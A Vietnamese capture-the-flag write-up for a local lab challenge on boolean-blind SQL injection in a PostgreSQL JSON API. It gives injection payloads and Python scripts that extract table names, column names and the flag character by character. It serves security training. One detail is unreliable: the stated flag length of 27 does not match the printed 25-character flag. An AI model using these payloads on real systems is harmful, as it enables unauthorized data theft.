# SQLi-026: PostgreSQL Boolean Blind via JSON - Writeup

## Flag: `FLAG{js0n_b0dy_1nj3ct10n}`

---

## 🔍 Bước 1: DETECT - Phát hiện SQLi

### Test Boolean Blind

**TRUE condition:**
```json
{"id":"1 AND 1=1"}
```
→ Response: `{"status":"found",...}` ✅

**FALSE condition:**
```json
{"id":"1 AND 1=2"}
```
→ Response: `{"status":"not_found"}` ✅

**Kết luận:** Boolean Blind SQLi confirmed!

---

## 🎯 Bước 2: IDENTIFY - Xác định DBMS

**Test PostgreSQL:**
```json
{"id":"1 AND version() LIKE '%Post%'"}
```
→ Response: `{"status":"found"}` ✅ PostgreSQL confirmed!

**Alternative:**
```json
{"id":"1 AND (SELECT current_database()) IS NOT NULL"}
```

---

## 🔢 Bước 3: ENUMERATE - Liệt kê thông tin

### 3.1. Đếm số bảng

**Kiểm tra có bao nhiêu bảng trong schema 'public':**
```json
{"id":"1 AND (SELECT count(table_name) FROM information_schema.tables WHERE table_schema='public')=3"}
```
→ `{"status":"found"}` → Có **3 bảng** ✅

### 3.2. Extract tên bảng thứ 1

Trong Boolean Blind, phải **extract từng ký tự**:

#### Query để lấy tên bảng thứ 1:
```sql
SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET 0
```

#### Extract ký tự đầu tiên (position 1):
```json
{"id":"1 AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET 0),1,1)='p'"}
```
→ `{"status":"found"}` → Ký tự đầu là 'p' ✅

#### Extract ký tự thứ 2:
```json
{"id":"1 AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET 0),2,1)='r'"}
```
→ `{"status":"found"}` → Ký tự thứ 2 là 'r' ✅

#### Tiếp tục cho đến hết...
→ Kết quả: **`products`**

### 3.3. Extract tên bảng thứ 2

Dùng `OFFSET 1` để lấy bảng thứ 2:
```json
{"id":"1 AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET 1),1,1)='u'"}
```
→ Kết quả: **`users`**

### 3.4. Extract tên bảng thứ 3

Dùng `OFFSET 2` để lấy bảng thứ 3:
```json
{"id":"1 AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET 2),1,1)='f'"}
```
→ Kết quả: **`flags`**

### 3.5. Script tự động extract tên bảng

```python
import requests

def check(payload):
    r = requests.post("http://localhost:5026/api/product", json={"id": payload})
    return r.json().get("status") == "found"

# Extract table names
tables = []
for offset in range(3):  # We know there are 3 tables
    table_name = ""
    for pos in range(1, 20):  # Max table name length
        found = False
        for c in "abcdefghijklmnopqrstuvwxyz_":
            payload = f"1 AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET {offset}),{pos},1)='{c}'"
            if check(payload):
                table_name += c
                print(f"[+] Table {offset+1}: {table_name}")
                found = True
                break
        if not found:  # End of table name
            break
    tables.append(table_name)

print(f"\n[+] Tables found: {tables}")
# Output: ['products', 'users', 'flags']
```

### 3.6. Xác định độ dài tên bảng (Optional)

Để tối ưu, có thể check độ dài trước:
```json
{"id":"1 AND LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET 0))=8"}
```
→ `{"status":"found"}` → Bảng thứ 1 có 8 ký tự ('products' = 8 chars) ✅

### 3.7. Liệt kê columns của bảng 'flags'

**Đếm số columns:**
```json
{"id":"1 AND (SELECT count(column_name) FROM information_schema.columns WHERE table_name='flags')=2"}
```

**Extract tên column thứ 1:**
```json
{"id":"1 AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='flags' LIMIT 1 OFFSET 0),1,1)='i'"}
```
→ Kết quả: **`id`**

**Extract tên column thứ 2:**
```json
{"id":"1 AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='flags' LIMIT 1 OFFSET 1),1,1)='v'"}
```
→ Kết quả: **`value`**

---

## 📤 Bước 4: EXTRACT - Trích xuất FLAG

### Xác định độ dài FLAG

```json
{"id":"1 AND LENGTH((SELECT value FROM flags LIMIT 1))=27"}
```
→ `{"status":"found"}` → FLAG có 27 ký tự ✅

### Extract từng ký tự của FLAG

**Ký tự thứ 1:**
```json
{"id":"1 AND SUBSTRING((SELECT value FROM flags LIMIT 1),1,1)='F'"}
```
→ `{"status":"found"}` → Ký tự đầu là 'F' ✅

**Ký tự thứ 2:**
```json
{"id":"1 AND SUBSTRING((SELECT value FROM flags LIMIT 1),2,1)='L'"}
```
→ `{"status":"found"}` → Ký tự thứ 2 là 'L' ✅

**Tiếp tục cho đến hết...**

### Automated Script

```python
import requests

def check(payload):
    r = requests.post("http://localhost:5026/api/product", json={"id": payload})
    return r.json().get("status") == "found"

flag = ""
for pos in range(1, 30):
    for c in "FLAG{}_0123456789abcdefghijklmnopqrstuvwxyz":
        payload = f"1 AND SUBSTRING((SELECT value FROM flags LIMIT 1),{pos},1)='{c}'"
        if check(payload):
            flag += c
            print(f"[+] Position {pos}: {flag}")
            break
    if c == '}':  # End of flag
        break

print(f"\n🎉 FLAG: {flag}")
```

---

## 🎉 Final Flag

```
FLAG{js0n_b0dy_1nj3ct10n}
```

---

## 📝 Summary

### Workflow:

1. **DETECT** → Test `1 AND 1=1` vs `1 AND 1=2`
2. **IDENTIFY** → Test `version() LIKE '%Post%'`
3. **ENUMERATE:**
   - Đếm bảng: `count(table_name)...=3`
   - Extract tên bảng: `SUBSTRING(...table_name...,pos,1)='c'`
   - Liệt kê columns: `SUBSTRING(...column_name...,pos,1)='c'`
4. **EXTRACT:**
   - Xác định độ dài: `LENGTH(...)=27`
   - Extract từng ký tự: `SUBSTRING(...value...,pos,1)='F'`

### PostgreSQL-Specific Syntax:

| Purpose | Syntax |
|---------|--------|
| Substring | `SUBSTRING(string FROM pos FOR len)` hoặc `SUBSTRING(string, pos, len)` |
| Length | `LENGTH(string)` |
| Version | `version()` |
| Database | `current_database()` |
| Limit/Offset | `LIMIT 1 OFFSET 0` |

### Key Payloads:

```json
// Count tables
{"id":"1 AND (SELECT count(*) FROM information_schema.tables WHERE table_schema='public')=3"}

// Extract table name (char by char)
{"id":"1 AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET 0),1,1)='p'"}

// Extract flag
{"id":"1 AND SUBSTRING((SELECT value FROM flags LIMIT 1),1,1)='F'"}
```

### Tips:

- PostgreSQL dùng `SUBSTRING(str FROM pos FOR len)` hoặc `SUBSTRING(str, pos, len)`
- Dùng `LIMIT 1 OFFSET n` để lấy từng row
- Boolean Blind phải extract **từng ký tự** một
- Nên xác định độ dài trước để tối ưu
